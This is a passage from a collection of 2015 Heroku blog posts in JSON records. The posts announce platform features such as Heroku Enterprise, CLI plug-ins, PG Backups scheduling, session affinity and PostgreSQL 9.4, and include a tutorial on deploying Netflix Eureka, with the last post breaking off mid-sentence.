{"website": "Heroku", "title": "Introducing Heroku Enterprise: New Features for Teams", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/introducing-heroku-enterprise-new-features-for-teams", "abstract": "Introducing Heroku Enterprise: New Features for Teams Posted by Jesper Joergensen February 19, 2015 Listen to this article Apps have transformed how we do almost everything. The ubiquity of mobile devices with millions of available apps mean that today, anyone can pull up an app in seconds to check their car engine , turn on the lights at home or ride a scooter across town . So far, the companies behind these apps have mostly been startups, many of which use Heroku to help them iterate quickly and stay focused on the customer experience instead of wasting time on infrastructure. Today we’re proud to announce Heroku Enterprise , a new edition of Heroku that helps larger companies take advantage of the same technology recipe while meeting their unique needs for more advanced collaboration, better access controls and enterprise-grade support. Collaboration at Any Scale Heroku Enterprise gives you a single organization-wide view of all developers, all applications and all resources. You can empower every single developer to innovate at their own pace while the organization retains complete visibility to the state of all projects: What apps are running in production? Who is collaborating on a particular app? What resources are being consumed by each app? What is the total resource use this month compared to previous months? With Heroku Enterprise, teams have a safe way to collaborate openly while still meeting company security standards. When off-boarding developers, all application access is revoked with a single action. Administrators can also audit the multi-factor authentication status of developer accounts to ensure they comply with company standards. Targeted Access Controls Every business, large or small, needs to have strong security controls in place. When you are asking customers to entrust you with their personal or business information, you (and they) will want to know who has access to that data and who can deploy code that touches it. In a small team with just a few developers, simple practices are sufficient. But as the team grows, so does the need for more formalized security controls. Heroku Enterprise introduces a new kind of application-level access control called a privilege. Privileges strike a balance between fine-grained permissions that are too hard to manage and coarse-grained, all-or-nothing flags that won’t do the job. In this initial release, we are introducing three app level privileges in beta: deploy, operate and manage . These app privileges let you separate areas of responsibility so that access is only granted to those who need it. They also let you delegate daily administration of individual apps across your team while retaining centralized visibility and control. We’re on the Same Team One of the critical benefits of Heroku is that our support experts become extended members of your development team when the need arises. Thanks to Heroku buildpacks and our managed application stack, we understand how your application is built. We can quickly set up identical test environments to debug a thorny problem, and we can fix security vulnerabilities down in the stack with no disruption to your app. With Heroku Enterprise, we are taking our support commitment one step further and offering a reduced, 30 minute response time on support requests. The combination of fast support responses with unmatched problem-solving abilities gives enterprises the confidence they need to practice continuous delivery on even the most mission critical apps. Learn More Want to learn more? On March 12, we'll be demoing all the features of Heroku Enterprise in a live webinar featuring Heroku customer Align Technology; you can sign up today . You can also read more about Organizations and App Privileges on Dev Center. Or, just fill out the form at the bottom of this page and someone from our sales team will contact you.", "date": "2015-02-19,"},
{"website": "Heroku", "title": "Heroku Connect Demo Edition Now Available via Heroku Button", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/heroku-connect-demo-edition", "abstract": "Heroku Connect Demo Edition Now Available via Heroku Button Posted by Margaret Francis February 24, 2015 Listen to this article Nine months ago we released Heroku Connect, the bi-directional data synchronization service that enables developers to build Heroku apps that seamlessly interact with Salesforce data.  Since then, we’ve seen developers use it to build all types of interesting apps for web and mobile, especially for eCommerce, loyalty, and Internet of Things use cases. We’ve also seen an avalanche of requests from every corner of the Salesforce ecosystem for a simple and free way to try Heroku Connect, and explore new use cases. Today we are announcing the availability of Heroku Connect Demo Edition, a free version of Heroku Connect designed for learning and experimentation but not production. With Demo Edition, engineers evaluating new architectural options and developers building proof-of-concept apps can validate Heroku Connect as their choice through hands on product experience.  It’s the perfect complement to a free Heroku account and a free Salesforce Developer Edition org. Getting started with Heroku Connect Demo Edition is easy and free. Anyone with a verified Heroku account can immediately stand up a Heroku app, a Heroku Postgres database, and the Heroku Connect add-on with a single press of this Heroku Button . If you don’t have a Heroku account, you can get one for free , and verify it simply by adding a credit card: you won’t be charged, this is simply a requirement for using any Heroku add-on. If you already have an app, you can add Demo Edition to it via the Heroku Add-ons marketplace or the CLI. $ heroku addons:add herokuconnect:demo -a appname Demo Edition Details There are limitations to Heroku Connect Demo Edition: the maximum rows of data synchronized between Heroku Postgres and Salesforce is 10,000, and users cannot create Streaming API connections to deliver Salesforce updates in real time.  Most features remain consistent with the commercial version: there's a “Poll Now” option to support development workflow, support for Sandbox or Production data, and users can share a Heroku Connect instance across all collaborators within a Heroku account. A final note: Current Heroku Connect users may not recognize the new UI, currently in beta.  The new UI streams log data into the log viewer in real time, provides a per-mapping view of data change volumes, and gives users a better view of connection status as well as an easier means to switch between them. Learn More Read more about the benefits of Heroku Connect in the Heroku Addons Marketplace . You can also check out the companion post on the Salesforce Developer’s blog , or review the documentation available on the Heroku Dev Center .  Or of course, you can request a salesperson to contact you . HerokuConnect Force.com salesforce", "date": "2015-02-24,"},
{"website": "Heroku", "title": "Managing your Microservices on Heroku with Netflix's Eureka", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/managing_your_microservices_on_heroku_with_netflix_s_eureka", "abstract": "Managing your Microservices on Heroku with Netflix's Eureka Posted by Joe Kutner March 03, 2015 Listen to this article Over the past few years, Netflix has open sourced many of the components that make up its production platform . These include Eureka for service discovery, Hystrix for handling service failure, Ribbon for client side load balancing, and many others. These projects are powerful, mature, and benefit from Netflix’s many years of experience deploying service-oriented applications in the cloud .  Adding credence to this, IBM , Yelp, Hotels.com and many others have adopted these technologies for their own systems. And there’s nothing stopping you from building them into your applications, too. Well, nothing except that many of the Netflix projects have a high barrier to entry because they're geared toward deployment on Amazon's EC2 platform and require a great deal of configuration and management in their raw form. But thanks to the Spring Framework , it's easy to deploy Netflix OSS on Heroku while adhering to the principles of the Twelve Factor app and benefiting from Heroku’s first-class developer experience. In this article, you'll learn how to deploy Netflix's Eureka server to Heroku and connect your own microservice clients to it. Introducing Microservices The Netflix projects are centered around the concept of microservices, which describe a strategy for decomposing a large project into smaller, more manageable pieces. Although decomposing big projects into smaller pieces is an age-old process, the recent microservices movement captures a number of best practices about how to do it well. For more discussion on microservices, see our recent blog post on Why Microservices Matter . One of the problems introduced by microservices is the large volume of services that must invoke other services in the system. Each of these services must know where to find the services it consumes, and attempting to manage the resulting configuration manually is intractable. To solve this problem Netflix created the Eureka server. A Eureka server is a service registry. It's like a phone book for your microservices. Each microservice registers itself with Eureka, and then consumers of that service will know how to find it. This is similar in spirit to a DNS service but with additional features such as host-side load-balancing and region-isolation. Eureka also keeps track of health, availability and other metadata about the service. That makes it an ideal place to start when building your own microservices architecture. Creating the Eureka server To begin, clone the Heroku Eureka server demo project, and move into it's root directory like so: $ git clone https://github.com/kissaten/heroku-eureka-server-demo.git\n$ cd heroku-eureka-server-demo/ Next, create a Heroku account , then download and install the Heroku toolbelt . With the toolbelt installed, create a Heroku application by running this command: $ heroku create\nCreating fast-beach-5250... done, stack is cedar-14\nhttps://fast-beach-5250.herokuapp.com/ | https://git.heroku.com/fast-beach-5250.git\nGit remote heroku added Next, create a configuration variable to define the default user's password. \nRun this command, but substitute a unique password for <PASSWORD> : $ heroku config:set EUREKA_USER_PASSWORD=<PASSWORD> Now you're ready to deploy. There are two methods you can choose from: Git deployment and Maven deployment . \nIn this article, we'll use Git deployment, which compiles the application remotely. To deploy, run this command: $ git push heroku master Your code will be pushed to the remote Git repository, and the Maven process\nwill execute on the Heroku servers. When it's finished, you can view your server by running this command: $ heroku open The site will request a username and password. Enter \"user\" and the password you set for the EUREKA_USER_PASSWORD config variable. After you are logged in you will see the Eureka dashboard. It indicates that no instances are currently registered. Creating a Eureka client A Eureka client is a service that registers itself with the Eureka server. A client typically provides meta-data about itself such as host and port, health indicator URL, and home page. It will also send heartbeat messages from each instance belonging to the service. If the heartbeat fails over a configurable timetable, the instance will be removed from the registry. To create your first Eureka client, clone the Eureka client demo repo and move into it's root directory by running these command: $ git clone https://github.com/kissaten/heroku-eureka-client-demo.git\n$ cd heroku-eureka-client-demo/ Then create a Heroku application for the client by running this command: $ heroku create\nCreating fast-beach-5250... done, stack is cedar-14\nhttps://fast-beach-5250.herokuapp.com/ | https://git.heroku.com/fast-beach-5250.git\nGit remote heroku added Next, create a configuration variable to define the URL of the Eureka server you created in the previous section. Run the following command, but substitute <URL> with the URL and credentials for the server in the form https://user:password@<appname>.herokuapp.com : $ heroku config:set EUREKA_URL=<URL> You'll also need to create a configuration variable for the domain name of your service -- this represents the domain name used by other components to consume your service. As long as you are using the defaults, it should will be in the form <appname>.herokuapp.com . You can set it by running this command (but replace <appname> with the app name of the client): $ heroku config:set DOMAIN_NAME=\"<appname>.herokuapp.com\" Now you can deploy. This article will use Git deployment again, but you may also use Maven deployment. Run the following command: $ git push heroku master After the build process finishes, you can view the application in a browser by running heroku open to confirm that it is running. Then view the logs by running the following command. $ heroku logs -t After the application has been running for about 30 seconds, you'll see something like this: com.netflix.discovery.DiscoveryClient : DiscoveryClient_MY-SERVICE/fast-hamlet-4577.herokuapp.com: registering service...\ncom.netflix.discovery.DiscoveryClient : DiscoveryClient_MY-SERVICE/fast-hamlet-4577.herokuapp.com - registration status: 204\ncom.netflix.discovery.DiscoveryClient : The response status is 200 This indicates that the client has registered with the Eureka server. You can confirm this result by refreshing the Eureka server dashboard. In the section titled \"Instances currently registered with Eureka\", you will see the MY-SERVICE instance. It's also possible to connect non-Spring clients by using Netflix's Eureka Client in it's raw form. Projects like Netflix's atlas and iep provide examples of using the client from Scala. Creating replica Eureka server instances The Eureka server does not have a persistent backing store. The registry is kept in memory because the service instances have to send heartbeats to keep their registrations up to date -- making it naturally resilient. Clients also have an in-memory cache of registrations, which keeps network traffic to a minimum, but also allows the system to continue working even if there is a failure or momentary outage for the Eureka server. Nonetheless, Eureka is a key part of a microservices architecture and redundancy is still important. That's why Eureka can be configured to register and replicate with other peer instances of the server. Netflix recommends running each Eureka server instance in a different availability zone, but for this article we'll go one step further and demonstrate how to run each server in different regions . First, return to the root directory of your Eureka server source code. Then open the src/main/resources/application.yml file and add the following code to the end of it: ---\nspring:\n  profiles: peer\neureka:\n  instance:\n    hostname: ${APP_NAME}.herokuapp.com\n  client:\n    registerWithEureka: true\n    fetchRegistry: true\n    serviceUrl:\n      defaultZone: ${EUREKA_PEER_URL}/eureka/ This enables replication by defining a new Spring profile called peer. To use this profile you must modify the application's Procfile by adding the option --spring.profiles.active=peer to the end of the web command. The complete Procfile should look like this: web: java $JAVA_OPTS -Dserver.port=$PORT -jar target/eureka-server-demo-*.jar --spring.profiles.active=peer Save both files and commit the changes to Git by running these commands: $ git add Procfile src/main/resources/application.yml\n$ git commit -m \"Added peer profile for replication\" Now create a new Heroku application in the EU region by running this command (or you can use --region us if your initial application was created in the EU region): $ heroku create --region eu --remote heroku-eu\nCreating polar-lowlands-1585... done, stack is cedar-14\nhttps://polar-lowlands-1585.herokuapp.com/ | https://git.heroku.com/polar-lowlands-1585.git\nGit remote heroku-eu added Before deploying to the new application, you must set a few config variables on both of your Eureka server applications. Run these commands and substitute the appropriate values accordingly: $ heroku config:set APP_NAME=\"<appname>\" -a <appname>\n$ heroku config:set APP_NAME=\"<appname-eu>\" -a <appname-eu>\n$ heroku config:set EUREKA_USER_PASSWORD=\"<PASSWORD>\" -a <appname-eu>\n$ heroku config:set EUREKA_PEER_URL=\"https://user:<PASSWORD>@<appname>.herokuapp.com\" -a <appname-eu>\n$ heroku config:set EUREKA_PEER_URL=\"https://user:<PASSWORD>@<appname-eu>.herokuapp.com\" -a <appname> Note that you are setting the EUREKA_PEER_URL on each app with the URL and credentials of the other app. Now you can deploy. Run these commands, one after the other: $ git push heroku master\n$ git push heroku-eu master After both deployments have completed, check the dashboard for each app. In the \"DS Replicas\" section you will see the opposing app listed. After a few moments, you will also see it listed under \"available-replicas\" in the \"General Info\" section (this means it has connected successfully). Now you can stand up additional replica nodes as necessary. Beyond service discovery Now that you can register and discover services, you're ready to add more of the Netflix components. Spring Cloud has convenient implementations of: Hysterix Clients : implements a circuit breaker pattern . Hysterix Dashboard : displays the health of each circuit breaker. Ribbon : a client side load balancer. Feign : a declarative web service client. The result is a powerful, production ready, microservices architecture with very little operational cost. Further reading For more information on Netflix open source software, see the Netflix OSS Homepage . For more information on Spring Cloud, see the Spring Cloud documentation . For further discussion on microservice architectures, see the recent post Why Microservices Matter on the Heroku blog.", "date": "2015-03-03,"},
{"website": "Heroku", "title": "Making CLI Plug-ins Better with a New Architecture", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/making_cli_plugins_better_with_a_new_architecture", "abstract": "Making CLI Plug-ins Better with a New Architecture Posted by Craig Kerstiens March 19, 2015 Listen to this article At Heroku, most of us love living in the CLI. Of course, we're absolutely dedicated to providing a great developer experience whether it’s in the dashboard or at the terminal, but we also believe a mastery of the command line interface offers great productivity to you as a developer. A well designed CLI coupled with other small sharp Linux tools provide primitives to build powerful productivity. Today we're introducing an exciting new foundation for the Heroku CLI – an entirely rebuilt plug-in architecture. This new plug-in infrastructure lays the groundwork for extending the power of the CLI, letting you be more productive than ever before. Want to know if your app is production ready? There’s now a plug-in for you . Want to search your app’s logs with Papertrail ? There’s now a plug-in for you. For many years, the most advanced Heroku users would create their own plug-ins to expand what you could do with the Heroku CLI. Our goal was to make this process easier, so we rethought both plug-in creation and use, and created a better platform for CLI plug-in development. Some of the highlights include: Simple discovery and installation Improved cross platform compatibility Easy plug-in updates and management To dig a little deeper into what these new plug-ins bring, read on or simply head over to the Dev Center to read our guide for creating them . Discovery and installation In the new architecture, plug-ins are npm packages that lay the groundwork for a much smoother experience. Once an npm package is published, you can install it by running heroku plugins:install nameofpackage . For those of you developing plug-ins, it will provide better discoverability of plug-ins, and those of you consuming them will no longer have to hunt through GitHub. Give it a try with an example plug-in for one of our add-on logging providers Papertrail which helps you manage and search through your logs: heroku plugins:install heroku-papertrail Now that you’ve installed it you can immediately begin using your new plug-in to search through your Papertrail logs in the CLI: heroku pt:logs error\nheroku pt:logs -t \"H12 OR R14 OR status=503\" As a plug-in developer you specify the heroku-plugin keyword in your package.json and publish it to npm where it’s indexed and searchable. This will better integrate them directly into your Heroku experience and eliminate the need for you to go discover which ones are ready for use vs. a work in progress on GitHub. Why Node A common question we’ve heard is: why the migration to Node for our plug-in architecture? We’re still Ruby fans but we also firmly believe in using the right tool for the right job, in this case we felt Node offered some key benefits. When it comes to creating a great CLI experience we wanted no platform (Linux, OS X, Windows) to feel superior to the other, but rather wanted all to have a great and powerful CLI experience should you choose to use it. The Node ecosystem of packages brings broader coverage of cross-platform compatibility, meaning you can simply use many of the packages you’d like to develop plug-ins more quickly and easily while not having to worry about as many compatibility issues. What’s next Today we’re excited to release this update for the Heroku Toolbelt, making it easier for you to add and contribute to the powerful ways in which others use Heroku. We’ve already got some great examples of new plug-ins: Heroku deploy archive which lets you easily deploy a tar archive directly to Heroku Heroku Papertrail Heroku production check If you’ve got an idea for how to improve and expand the Heroku toolbelt, then get started building today.", "date": "2015-03-19,"},
{"website": "Heroku", "title": "PG Backups Levels Up", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/pgbackups-levels-up", "abstract": "PG Backups Levels Up Posted by Rimas Silkaitis March 11, 2015 Listen to this article Performing a backup is one of those tasks that ensures your application can recover from database or hardware failures should they ever occur.  Over four year ago, we recognized this as a best practice and came out with PGBackups, an add-on that reduces the risk and complexity of taking database backups.  Today, we’re pleased to announce two big improvements: enhanced reliability, and the ability to schedule backups. Better By Default One of the main drivers for the upgrade was the occasional backup stall experienced by users.  In some cases, PGBackups would encounter a bug that resulted in degraded performance of the database while a backup was being taken.  This had adverse effects for the database as well as the applications that counted on it.  While we espouse Continuous Protection for our standard plans and above, we needed to fix the issue of these backup stalls -- so we did. Dirk Kelly, a Lead Software Engineer at Interexchange.org, has been using the new backup system for a few months now and says that “[he] uses it heavily at Interexchange to sync data between environments.  Since using the new system, we’ve noticed an increase in reliability and performance.” Schedule Backups On Your Time With PGBackups being out in the wild for such a long time, it’s given us an opportunity to see the many different ways it has been used.  One of the main use cases was scheduling backups.  We saw thousands of manual backups being performed daily amongst all of the databases we host, so we wanted to give everyone the ability to perform a backup on their schedule without resorting to using Heroku Scheduler.  With the new PGBackups, you can do just that.  For each database that you have in your application, you can give it a time as well as a timezone of when you want to start that backup process: heroku pg:backups schedule HEROKU_POSTGRESQL_GOLD --at=\"02:00 PDT\" --app sushi In this example, we’re kicking off our daily backup process at 2 AM Pacific time.  When scheduling with the at option, you can specify a timezone abbreviation, like PDT, or the full time zone designation, like ‘America/Los_Angeles’.  The best part about this new feature is that there’s no need to manage an external crontab or Heroku Scheduler to invoke scheduled backups. Behind The Scenes Heroku Postgres Backups still uses pg_dump to create the backup on disk, which works well for databases that are 20GB in size or less.  The reason we have a limit around 20GB is that pg_dump on larger databases causes contention for IO, memory and CPU.  As a result, the longer run time needed to complete the backup increases the chance of an error that will end your backup capture prematurely. If your database is larger than 20GB in size, don’t fret!  Heroku’s Continuous Protection has got you covered.  As a best practice, when a database does get big enough, the backup mechanism should transition from using a tool like pg_dump to creating binary copies of the cluster files and Write Ahead Logs (WAL). Getting Started Over the course of the next two weeks, we will be working to migrate all of the old backups from the PGBackups add-on to the new system. You will be notified when this cutover will be taking place. On top of that, we will be removing PGBackups from the Add-on Marketplace starting today.  As a result, the backup commands have changed slightly because they’re now included in the pg namespace of the Heroku Postgres add-on.  This means that you should start using the new commands immediately and, to get you started, we’ve provided a mapping document between the old commands and the new ones. heroku pg:backups [subcommand] Of course, if you don’t like our approach to backups, you don’t need to use PGBackups.  It’s an add-on like any other in the Add-on Marketplace, and we welcome other add-ons that may be different or better for different circumstances. Ours is but one approach to doing backups and we want to make sure that developers have the choice and flexibility to build a solution that works for them. Availability The enhanced PGBackups is available in the new version of the Heroku CLI for all plans. Upgrade your Heroku CLI to the latest version and let us know what you think. heroku update postgres pgbackups", "date": "2015-03-11,"},
{"website": "Heroku", "title": "Announcing Heroku Elements – The Marketplace for the Builders of the App Economy", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/introducing_the_heroku_elements_marketplace", "abstract": "Announcing Heroku Elements – The Marketplace for the Builders of the App Economy Posted by Craig Kerstiens April 16, 2015 Listen to this article These days, apps are more composed than built. Long past are the days of spinning up your own Elasticsearch cluster to add search to your application. Instead we borrow from previous projects, and adapt a template as a good foundation. It’s a great improvement – but the process of keeping up to date with the right services, tools, and templates can be a time consuming task at best, and an overwhelming flood of new information at worst. Today we're excited to announce Heroku Elements, a new marketplace that brings all of the pieces within our Heroku ecosystem together in one place.  It’s a simpler way to discover and select the best components to build apps fast. In a nutshell, Heroku Elements includes: Adds-ons, together with data and insights - Choosing the right add-on isn’t always easy. Sometimes you want to evaluate all of them, and sometimes you’d prefer to use a trusted name and quickly move on. The Heroku Elements marketplace adds more data about your add-ons and provides tools to better guide you as you compose your app. Buildpack discovery - Since we launched buildpacks over three years ago, we’ve seen you use them in all sorts of clever and crazy ways . Now it becomes trivial to take advantage of a buildpack someone else created. Search the Heroku Elements marketplace to discover new buildpacks from Heroku or choose from the hundreds built and maintained as part of our ecosystem. Button discovery - Buttons provide the easiest way to get up and running with an example template or sample app on Heroku. We’d love you to head directly over to Heroku Elements and check it out; or if you like, read on to learn about some of the things Heroku elements brings to you. Add-ons With almost one hundred and fifty different add-ons to choose from, customers often ask us which providers are right for their project. We've made this easier by surfacing more information about add-ons to help you find the right service for your app. With newly exposed data you now have better flexibility to choose exactly what’s right. Need an identity management service that works well with Python and runs in the US region? Now you can easily discover Stormpath, which perfectly fits those criteria. We now give you more insight into how certain add-ons rank in different ways. We’ve got lists that let you explore what’s popular, what’s upcoming and more: just check out one of them . Buildpacks Over three years ago we laid the foundation of buildpacks, an ecosystem that has grown to contain over 900 buildpacks. The communities developing buildpacks range from Meteor , to ember-cli , to Haskell , even to Minecraft . Now running any language you like on Heroku is easier than ever before with buildpacks becoming a core Element of the Heroku platform – simply browse the Elements marketplace for a buildpack that suits your needs and get started with it. In addition to discovering all of the buildpacks available, you can easily find more data about how actively they’re used and maintained. This data lets you easily discover new ones that may be beneficial to your app, while also giving confidence that you’ll spend more time building your app and less tweaking and debugging your build process. Buttons We launched Heroku Button last August, and since then we’ve seen an explosion in buttons created. For the uninitiated, the Heroku Button is a simple HTML or Markdown snippet that can be added to READMEs, blog posts and other places where code lives. Clicking a Heroku Button will take you through a guided process to configure and deploy an app running the source code referenced by the button. Buttons are being used to meet all sorts of use cases, from tutorials and getting started guides such as for reactjs , to Twilio creating a rapid response toolkit to help support cities when emergencies occur letting them simply and easily spin up the tools they need. At Heroku we’ve been busy creating several of our own such as Nibs , which provides a reference architecture for a customer engagement app. With over 1700 buttons already, Heroku Elements makes it easy to navigate through the land of buttons to find the template you need to get building faster. In addition to discovering some of the most popular and newest buttons available, buttons are now more deeply connected to other Heroku Elements. You now have the ability to see Heroku Buttons that showcase specific add-ons, as well as insights on specific buttons and all the tools and services they utilize. Conclusion There are a number of pieces involved in composing an app these days. You need to choose a programming language/runtime, you need to pick the services that will back your app, and you want to learn how to use all these technologies and get started quickly. On Heroku, no matter if you're a senior architect in a major enterprise or a new developer learning the ropes, you can find everything you need under one roof: the Heroku Elements marketplace.", "date": "2015-04-16,"},
{"website": "Heroku", "title": "Introducing Session Affinity", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/introducing_session_affinity", "abstract": "Introducing Session Affinity Posted by Craig Kerstiens April 28, 2015 Listen to this article Today we’re excited to announce public beta support for HTTP session affinity, a feature that makes building real-time applications easier than ever. Session affinity improves end user experience in certain types of applications and architectures where you require some level of extra state within your application code, because it ensures related requests get routed to the same instance of your code. This improves performance reducing the need to go and get the needed state for a specific user. At high level, here's how it works: When you enable session affinity on your application, the Heroku router will set a special cookie on every HTTP request. This cookie will allow our routing layer to consistently route requests for a client session to the same dyno. This means you can reduce the roundtrip needed to get various session data for a user making your real-time applications fast and responsive. If you’re already using one of the popular libraries that take advantage of session affinity such as Socket.IO , Meteor or Lift all you need to do is enable the feature for your app: $ heroku labs:enable http-session-affinity We’re extremely excited to introduce this, having already received some great reactions, such as the following from Guillermo Rauch, creator of Socket.io: \"Heroku always executes with the right developer experience. Just a flag for enabling session affinity? They really get it.\" We encourage you to give it a try today with some of our guides to help you get your hands dirty, or read on further for some of the background on how this works. A guide to session affinity When building a web application the simplest way to ensure scalability is to have your web application be as stateless as possible . The key here is have all state or as much as possible in your backing services (such as a Postgres, Memcached, etc). This creates a certain level of chattiness as apps begin to embrace real-time features. In many cases, you can reduce this chattiness by keeping more information locally where possible. Session affinity falls right in the middle of full sticky sessions and entirely stateless web front-ends. With session affinity, if a known dyno holds your session then you’ll be routed to it. If there isn’t one ( this could be due to a dyno restart, a redeploy of your application, or your dyno having been scaled down ) then we’ll route to a new dyno in which your application will grab the state from the database or other backing service. In this case, a new session will be established and used for future routing. How it works within the router By default, when the router receives a request, it randomly selects a dyno to forward it to and then proxies the content to it. Every request is entirely standalone. When session affinity is turned on, the router will assign a request randomly the first time it sees a particular client. When the response from the dyno passes through the router, it will add a header to the response asking the user to store a cookie named heroku-session-affinity . The router then uses this cookie to identify the correct dyno to route future requests to. Whether it’s due to a fresh code release, a server failure, or a crash in your code, sometimes that dyno will become unavailable. In such circumstances, the router will pick a new random dyno for this session, and subsequent requests will keep going there until the original dyno is back in place again. When your application scales up, new dynos should receive an even share of traffic and relieve pressure on existing dynos. The router probabilistically plucks a portion of clients from their assigned dyno and reassigns them to the new one, ensuring roughly equal distribution. Heroku’s session affinity mechanism ends up having the following properties: The effect of a dyno joining or leaving the entire set of dynos for an app is minimized. A dyno being unresponsive causes no downtime to the client; the request is routed to a different dyno temporarily The mechanism is portable and requires no modifications to the application no matter the platform or language, as long as the HTTP client’s users support HTTP cookies. Conclusion Session affinity meets a great middle ground. You account for failure cases by ensuring you’re not 100% sticky – thus leaving your application more fault tolerant. At the same time, apps that need this type of stateful behavior can now do so with far less code. If you’re using Meteor, Socket.io, Lift or another other library or framework that would benefit give it a try today.", "date": "2015-04-28,"},
{"website": "Heroku", "title": "PostgreSQL 9.4 General Availability", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/postgres-94-general-availability", "abstract": "PostgreSQL 9.4 General Availability Posted by Rimas Silkaitis April 23, 2015 Listen to this article We’re pleased to announce PostgreSQL 9.4 in general availability for Heroku Postgres.  After announcing the beta earlier this year, we’ve had many developers provision databases against this new version.  Throughout the beta period, developers raved about the new data type along with the performance enhancements to materialized views.  This uptake by early adopters demonstrates an interest in everything that the new version of PostgreSQL provides, from features to performance. New Features and Performance Updates One of the most notable new features of 9.4 is the JSONB data type .  While the text-based JSON data type has existed in PostgreSQL for some time, JSONB is a binary storage format that brings many performance gains along with the support for indexes.  What’s exciting about this feature is that you now have the reliability and durability of a relational database mixed with the flexibility of a document-oriented database. On the performance side, materialized views have been upgraded to allow for updates in the background.  Prior to PostgreSQL 9.4, when a materialized view was updated, an exclusive lock was created against the materialized view, which meant that any subsequent query that used the view was blocked until the update finished.  With this release of Postgres, materialized views can be updated concurrently.  This means that queries that read from the materialized view can continue to run while the update happens in the background, which results in faster, up-to-date reporting. Getting Started Starting today, when you provision a new Heroku Postgres database, 9.4 will be the default.  This means that you’ll get the benefits of concurrent materialized views, the new JSONB data type as well as all the latest in terms of performance, stability, and functionality.  If you haven’t upgraded your current databases, we encourage you to do so.  As with any new release, we’d love to hear about how you’re using it at postgres@heroku.com . postgres", "date": "2015-04-23,"},
{"website": "Heroku", "title": "#WIT: Inspiring the World’s Next Generation of Female Leaders in Tech", "author": ["Katie Boysen"], "link": "https://blog.heroku.com/technovation_challenge", "abstract": "#WIT: Inspiring the World’s Next Generation of Female Leaders in Tech Posted by Katie Boysen April 30, 2015 Listen to this article At Heroku and at Salesforce, we’re always looking for ways we can help increase the number of young women with access to careers in science, technology, engineering and math.  Recently, thanks to a Heroku engineering manager’s involvement on this issue with a local school, we hosted a Technovation Challenge event at the Heroku offices.  We wanted to share the story about this great program - the Technovation Challenge is an annual competition, and you could do something similar in your community! Some background For the past 3 years, Heroku engineering manager Margaret Le has mentored a group of high school girls at the Immaculate Conception Academy (ICA), a San Francisco high school that provides private education to girls that come from low income families, for the Technovation Challenge. The Technovation Challenge is an inspiring yearly program that centers around a competition aimed at encouraging young women in entrepreneurship and careers in technology. Together, they build a mobile app from idea to implementation. It begins with identifying a problem in their community and ends with a business pitch for a solution. On April 17, the young women from ICA were at Heroku to present their Technovation Challenge pitches. By all accounts, it was an amazing experience for them and for us at Heroku -- the creativity and thoughtfulness of the app ideas was inspiring, and the pitches and feedback sessions were great.  After the event, I asked Margaret a few questions to get more details on the program and what it means to get involved. What is the Technovation Challenge? The Technovation Challenge is a program run by Iridescent , a 501c3 non-profit that helps scientists, engineers and technology professionals share their passion with children from underrepresented groups. It’s a 12 week program designed to foster interest in technology and entrepreneurship in young women from middle school through college. At the end of the of the 12 week program, the girls are offered a chance to present their mobile applications in front of a panel of judges. The program is open to girls in middle school, high school and college from all over the world, with prizes for categories based on age group. This year, over 2500 girls from 28 countries have submitted 650 mobile applications to the competition. Why did you decide to get involved? When I moved to the Bay Area, I participated in as many girls in tech outreach programs that my schedule would allow. While I enjoyed mentoring in workshops with Black Girls Code and other programs, I wanted something more similar to Big Sisters where I could develop longer relationships with the girls I interacted with. Working with Technovation and partnering with Ms. Torres from ICA has been a tremendously rewarding experience for me and what keeps me staying involved. I mentor, I’ve helped judge, and this year I’m part of the Technovation Challenge World Pitch Council, the group responsible for helping put on the event for the finalists to showcase their work. What are the kinds of apps that the girls build? The spectrum of solutions that are coming from these girls are diverse and touch on a variety of different topics from health and safety to fun food-centric apps. I’ve seen all kinds of amazing apps, ranging from girls in Africa that helped locate clean water resources to safety alert applications for women that live and work in urban areas. How do the girls benefit from the Technovation Challenge? The girls are able to work closely with female technology professionals, making it easier for them to imagine a similar future. They’re also able to create lasting relationships with people who could potentially connect them with internship opportunities or jobs in the future. The girls learn how to define a problem, brainstorm solutions, create user-centered designs, conduct market research and competitive analysis, brand and promote their application, investigate potential revenue sources, and pitch their ideas to others. Over the course of the 12 week program, field trips and company tours are arranged to expose the girls to a world they may not have envisioned for themselves previously. Because they work on many facets of app development -- from the business side: market research, creating content and commercials, in addition to the technology side: app development, product management -- they are able to explore many more possibilities that may not have been exposed to them. What’s the best thing you've learned from being a part of the Technovation Challenge? I’ve learned that for all of us (the girls, the coach, myself), recognizing that it’s about the journey and not the outcome is super important. Don’t be afraid to fail and keep trying. ICA has yet to win a challenge, but every year the girls keep at it. It’s so great to see. How can the community get involved? The community can get involved in Technovation by signing up to be a coach or mentor - they’re always looking for more students to participate, as well as coaches and mentors. You can also come to the World Pitch Event and support the teams who’ve made it to finals, by watching their pitches and witness all that they have achieved through the program! Get involved: http://www.technovationchallenge.org/get-involved/ Donate: http://www.technovationchallenge.org/donate/", "date": "2015-04-30,"},
{"website": "Heroku", "title": "Introducing 'heroku docker:release': Build & Deploy Heroku Apps with Docker", "author": ["Michael Friis"], "link": "https://blog.heroku.com/introducing_heroku_docker_release_build_deploy_heroku_apps_with_docker", "abstract": "Introducing 'heroku docker:release': Build & Deploy Heroku Apps with Docker Posted by Michael Friis May 05, 2015 Listen to this article Important update We've recently made some big updates to our support for Docker and the feature described in this blog post has been deprecated.  Learn more in the container registry and runtime dev center documentation. When Heroku launched the Cedar container stack 4 years ago, we became one of the first companies to use Linux Containers (LXC) to create a secure, performant and scalable cloud platform. Heroku has been a leader in the containerization movement, and we’ve spent years hardening, honing and evolving our runtime container stack. This means that developers can git push apps written in their favorite language and Heroku will build containers that are deployed to a production-quality environment.  With this approach, developers are set free from managing operating systems, package updates, server infrastructure and their inevitably complex interactions. Containers are essential to making this model work, as they create firm abstractions and boundaries between an application’s code and all the dependent pieces necessary to make them run.  And the benefits of containers for deploying and running apps are familiar to most developers using Heroku; freedom from having to manage down-stack components, confidence that apps will continue to run as operating system and environment dependencies change, and the ability to start, stop and scale apps quickly. As the container ecosystem has evolved, there’s an opportunity to bring the benefits of this technology not just to running apps on the server, but also building them on the desktop. In doing so, the hope is to address the challenges of creating and managing local development environments, as installing and managing local language runtimes, frameworks and associated 